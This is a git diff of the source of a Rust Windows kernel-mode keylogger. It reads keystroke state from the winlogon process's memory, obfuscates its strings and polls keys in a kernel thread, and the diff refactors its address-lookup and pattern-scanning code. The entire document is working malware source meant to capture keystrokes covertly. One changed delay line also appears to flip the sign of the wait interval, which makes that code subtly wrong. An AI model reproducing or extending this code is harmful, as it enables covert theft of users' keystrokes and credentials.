@@ -1,23 +1,23 @@
 use {
+    keys::VK_CHARS, 
+    obfstr::obfstr,
+    shared::structs::Keylogger, 
+    core::{ffi::c_void, mem::size_of}, 
     crate::{
-        get_ks_byte, get_ks_down_bit,
-        is_key_down, set_key_down, 
-        includes::MmCopyVirtualMemory, process::Process, 
+        get_ks_byte, get_ks_down_bit, includes::MmCopyVirtualMemory, 
+        is_key_down, process::Process, set_key_down, 
         utils::{
             address::{get_address_asynckey, get_module_base_address}, 
-            get_process_by_name, process_attach::ProcessAttach
+            get_process_by_name, patterns::scan_for_pattern, 
+            process_attach::ProcessAttach
         }
     }, 
-    core::{ffi::c_void, mem::size_of}, 
-    keys::VK_CHARS, 
-    obfstr::obfstr, 
-    shared::structs::Keylogger, 
     wdk_sys::{
         ntddk::{
             IoGetCurrentProcess, KeDelayExecutionThread,
             PsTerminateSystemThread,
         },
-        LARGE_INTEGER, NTSTATUS, PVOID, STATUS_SUCCESS, _MODE::KernelMode,
+        LARGE_INTEGER, NTSTATUS, STATUS_SUCCESS, _MODE::KernelMode,
     }
 };
 
@@ -63,7 +63,7 @@ fn vk_to_char(key: u8) -> &'static str {
 /// # Parameters
 /// - `address`: Array address `gafAsyncKeyState`.
 ///
-unsafe fn update_key_state(address: *mut c_void) {
+unsafe fn update_key_state(address: *mut u8) {
     core::ptr::copy_nonoverlapping(KEY_STATE.as_ptr(), KEY_PREVIOUS.as_mut_ptr(), 64);
 
     if !initialize_winlogon_process() {
@@ -74,7 +74,7 @@ unsafe fn update_key_state(address: *mut c_void) {
         let mut return_number = 0;
         MmCopyVirtualMemory(
             winlogon_eprocess.e_process,
-            address,
+            address as _,
             IoGetCurrentProcess(),
             KEY_STATE.as_ptr() as *mut c_void,
             size_of::<[u8; 64]>() as u64,
@@ -151,7 +151,7 @@ pub unsafe extern "C" fn keylogger(_address: *mut c_void) {
         }
         
         let mut interval = LARGE_INTEGER {
-            QuadPart: -1 * (50 * 10000 as i64),
+            QuadPart: -1 * -(50 * 10000_i64),
         };
 
         KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);
@@ -166,9 +166,9 @@ pub unsafe extern "C" fn keylogger(_address: *mut c_void) {
 /// # Returns
 /// `Option<PVOID>`: The address of the `gafAsyncKeyState` array if found, otherwise `None`.
 ///
-unsafe fn get_gafasynckeystate_address() -> Option<PVOID> {
+unsafe fn get_gafasynckeystate_address() -> Option<*mut u8> {
     if !initialize_winlogon_process() {
-        return None;
+        return None
     }
 
     let winlogon_eprocess = WINLOGON_EPROCESS.as_ref()?;
@@ -183,20 +183,7 @@ unsafe fn get_gafasynckeystate_address() -> Option<PVOID> {
     // fffff4e1`18e41bb5 48 89 81 80 00 00 00  mov qword ptr [rcx+80h],rax
     let instructions = [0x48, 0x8B, 0x05];
 
-    if let Some(y) = function_bytes.windows(instructions.len()).position(|x| *x == instructions) {
-        let position = y + 3;
-        let offset = function_bytes[position..position + 4]
-            .try_into()
-            .map(u32::from_le_bytes)
-            .expect("Slice length is not 4, cannot convert");
-        
-        let new_base = function_address.cast::<u8>().offset((position + 4) as isize);
-        let gaf_async_key_state = new_base.cast::<u8>().offset(offset as isize);
-
-        return Some(gaf_async_key_state as PVOID);
-    }
-
-    None
+    scan_for_pattern(function_address, &instructions, 3, 7, 0x200, u32::from_le_bytes)
 }
 
 /// Sets the keylogger status.
